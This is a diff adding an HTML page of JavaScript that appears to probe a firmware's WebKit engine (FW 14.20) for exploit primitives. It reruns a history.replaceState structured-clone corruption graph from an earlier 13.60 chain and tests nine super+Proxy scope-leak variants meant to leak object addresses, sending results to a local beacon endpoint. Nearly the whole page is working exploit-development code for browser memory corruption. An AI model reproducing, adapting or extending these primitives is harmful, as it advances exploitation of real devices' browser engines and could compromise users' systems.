@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V918 - replaceState clone probe + scope-leak variants (FW 14.20)</title>
+<style>
+  body { background:#0b0e14; color:#d7e0ea; font-family:ui-monospace,Menlo,monospace; padding:14px; }
+  h1 { color:#58a6ff; font-size:15px; margin:0 0 6px; }
+  p  { color:#8b949e; font-size:12px; margin:4px 0 10px; line-height:1.55; }
+  pre { font-size:12px; white-space:pre-wrap; }
+  code { color:#c9d1d9; background:#21262d; padding:1px 5px; border-radius:4px; }
+  .key { border-left:3px solid #d29922; padding-left:8px; }
+</style>
+</head>
+<body>
+<h1>V918 - clone-corruption probe + scope-leak variants</h1>
+
+<p class="key">
+<b>V917 found:</b> the official chain dies at its FIRST step on 14.20 - the super+Proxy scope leak
+returns undefined (= spec behavior = the JSC bug is fixed). But re-reading the chain flow showed
+the <b>scope leak is only an AUXILIARY address-leak</b>. The <b>ROOT bug</b> is
+<b>history.state returning the internal clone graph corrupted</b>
+(replaceState with a 0xffff+1 array, BigInt fillers, and -64000 at index 0xffff ->
+clone.length becomes 0x50001 and index 2 desyncs). <b>That root bug was never tested on 14.20</b>
+(the flow dies before its validation).
+<b>Part 1:</b> run the EXACT 13.60 storeHistoryGraph() and inspect history.state directly:
+length, index-1-vs-2 identity, element types. Corruption signature = length 0x50001 AND [1] !== [2].
+<b>Part 2:</b> scope-leak VARIANTS (different traps/receivers/shapes) - if the JSC fix is narrow,
+a variant may still leak the scope object.
+Pure JS, no crash risk. Beacons prefix: <code>V918-</code>.
+</p>
+
+<pre id="out">starting...</pre>
+
+<script>
+'use strict';
+
+var RUN = 'r' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 7);
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+
+function bks(tag, body) {
+  var u = '/beacon/V918-' + tag + '?d=' +
+          encodeURIComponent(String(body == null ? '' : body).slice(0, 440)) +
+          '&run=' + encodeURIComponent(RUN) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); }
+  catch (e) { try { var i = new Image(); i.src = u; } catch (e2) {} }
+}
+
+function safeStr(v) {
+  try {
+    var t = typeof v;
+    if (v === null) return 'null';
+    if (t === 'object' || t === 'function') {
+      var name = '';
+      try { name = String(v); } catch (e) { name = '<unstringable>'; }
+      var keys = '';
+      try { keys = Object.keys(v).slice(0, 5).join(','); } catch (e2) {}
+      return t + '(' + name.slice(0, 40) + ')keys=' + keys;
+    }
+    return t + ':' + String(v).slice(0, 40);
+  } catch (e) { return 'STR-ERR'; }
+}
+
+/* ==== Part 1: the exact 13.60 clone graph ==== */
+function storeHistoryGraph() {
+  var fillerBigIntCount = 1;   /* non-legacy WebKit (FW 9+) */
+  var referenceTarget = { marker: 0x51515151 };
+
+  var fillerGraph = new Array(0xfffd);
+  var pos = 0;
+  var huge = 1n << 40n;
+  for (var i = 0; i < fillerBigIntCount; i++) fillerGraph[pos++] = huge + BigInt(i);
+  while (pos < fillerGraph.length) fillerGraph[pos++] = {};
+
+  var outerGraph = new Array(0xffff + 1);
+  outerGraph[0] = fillerGraph;
+  outerGraph[1] = referenceTarget;
+  outerGraph[2] = referenceTarget;
+  outerGraph[0xffff] = -64000;
+
+  history.replaceState(outerGraph, "");
+}
+
+function probeClone() {
+  var out = [];
+  try {
+    storeHistoryGraph();
+    out.push('replaceState=ok');
+  } catch (e) {
+    out.push('replaceState=ERR:' + String(e && e.message).slice(0, 60));
+    return out.join(',');
+  }
+
+  var clone = null;
+  try { clone = history.state; } catch (e2) { out.push('state=ERR:' + String(e2 && e2.message).slice(0, 60)); return out.join(','); }
+  out.push('stateType=' + safeStr(clone));
+
+  try {
+    out.push('len=' + clone.length + '(want 0x50001=' + 0x50001 + ')');
+  } catch (e3) { out.push('len=ERR'); }
+
+  try {
+    var same = clone[1] === clone[2];
+    out.push('idx1eq2=' + (same ? 'SAME(unchanged)' : 'DIFF(CORRUPTED!)'));
+    out.push('idx2=' + safeStr(clone[2]));
+    out.push('idx1=' + safeStr(clone[1]));
+  } catch (e4) { out.push('idx=ERR:' + String(e4 && e4.message).slice(0, 50)); }
+
+  try {
+    out.push('idxLast=' + safeStr(clone[0xffff]));
+  } catch (e5) {}
+
+  try {
+    var fg = clone[0];
+    out.push('filler=' + (fg ? (fg.length + ':' + safeStr(fg[0])) : 'null'));
+  } catch (e6) { out.push('filler=ERR'); }
+
+  return out.join(',');
+}
+
+/* ==== Part 2: scope-leak variants ==== */
+function vOriginal() {
+  class Leaker { leak() { return super.foo; } }
+  Leaker.prototype.__proto__ = new Proxy({}, {
+    get: function (target, property, receiver) { return receiver; },
+  });
+  var leak = Leaker.prototype.leak;
+  return (function () { return leak(); })();
+}
+function vTargetTrap() {
+  class Leaker { leak() { return super.foo; } }
+  Leaker.prototype.__proto__ = new Proxy({}, {
+    get: function (target, property, receiver) { return target; },
+  });
+  var leak = Leaker.prototype.leak;
+  return (function () { return leak(); })();
+}
+function vFixedObj() {
+  class Leaker { leak() { return super.foo; } }
+  Leaker.prototype.__proto__ = new Proxy({}, {
+    get: function () { return { leaked: 1 }; },
+  });
+  var leak = Leaker.prototype.leak;
+  return (function () { return leak(); })();
+}
+function vReflect() {
+  class Leaker { leak() { return super.foo; } }
+  var p = new Proxy({}, { get: function (t, k, r) { return r; } });
+  Leaker.prototype.__proto__ = p;
+  var leak = Leaker.prototype.leak;
+  return (function () { return Reflect.get(p, 'foo', undefined); })();
+}
+function vSuperSet() {
+  var captured = null;
+  class Leaker { set x(v) { super.x = v; } }
+  Leaker.prototype.__proto__ = new Proxy({}, {
+    set: function (target, property, value, receiver) { captured = receiver; return true; },
+  });
+  var inst = new Leaker();
+  try { inst.x = 1; } catch (e) {}
+  return captured;
+}
+function vPlainProxy() {
+  class Leaker { leak() { return super.foo; } }
+  Leaker.prototype.__proto__ = new Proxy({}, {});
+  var leak = Leaker.prototype.leak;
+  return (function () { return leak(); })();
+}
+function vComputed() {
+  class Leaker { leak() { return super['fo' + 'o']; } }
+  Leaker.prototype.__proto__ = new Proxy({}, {
+    get: function (target, property, receiver) { return receiver; },
+  });
+  var leak = Leaker.prototype.leak;
+  return (function () { return leak(); })();
+}
+function vCallWithThis() {
+  class Leaker { leak() { return super.foo; } }
+  Leaker.prototype.__proto__ = new Proxy({}, {
+    get: function (target, property, receiver) { return receiver; },
+  });
+  var leak = Leaker.prototype.leak;
+  var holder = { marker: 'CALLTHIS' };
+  return (function () { return leak.call(holder); })();
+}
+function vProtoSwap() {
+  class Leaker { leak() { return super.foo; } }
+  var leak = Leaker.prototype.leak;
+  var p = new Proxy({}, { get: function (t, k, r) { return r; } });
+  Leaker.prototype.__proto__ = p;
+  return (function () { return leak(); })();
+}
+
+var VARIANTS = [
+  ['v-original', vOriginal],
+  ['v-targetTrap', vTargetTrap],
+  ['v-fixedObj', vFixedObj],
+  ['v-reflect', vReflect],
+  ['v-superSet', vSuperSet],
+  ['v-plainProxy', vPlainProxy],
+  ['v-computed', vComputed],
+  ['v-callThis', vCallWithThis],
+  ['v-protoSwap', vProtoSwap],
+];
+
+function main() {
+  bks('BOOT', 'run=' + RUN + ',ua=' + String(navigator.userAgent).slice(0, 50));
+  say('V918 boot');
+
+  say('--- Part 1: clone corruption probe ---');
+  var cloneRes = probeClone();
+  say('CLONE: ' + cloneRes);
+  bks('CLONE', cloneRes.slice(0, 430));
+
+  say('--- Part 2: scope-leak variants ---');
+  var summary = [];
+  for (var i = 0; i < VARIANTS.length; i++) {
+    var name = VARIANTS[i][0], fn = VARIANTS[i][1];
+    var res;
+    try {
+      var v = fn();
+      res = safeStr(v);
+      if (v !== undefined && v !== null) summary.push(name + '=LEAK:' + res.slice(0, 60));
+    } catch (e) {
+      res = 'ERR:' + String(e && e.message).slice(0, 50);
+    }
+    say(name + ' -> ' + res);
+    bks('VAR-' + name, res.slice(0, 200));
+  }
+
+  say('--- summary ---');
+  var sum = summary.length ? summary.join(' ; ') : 'ALL-VARIANTS-SPEC (leak fully patched)';
+  say(sum);
+  bks('SUMMARY', sum.slice(0, 430));
+  bks('DONE', 'run=' + RUN);
+  say('DONE.');
+}
+
+try { main(); } catch (e) { bks('FATAL', String(e && (e.message || e)).slice(0, 160)); say('FATAL ' + e); }
+</script>
+</body>
+</html>
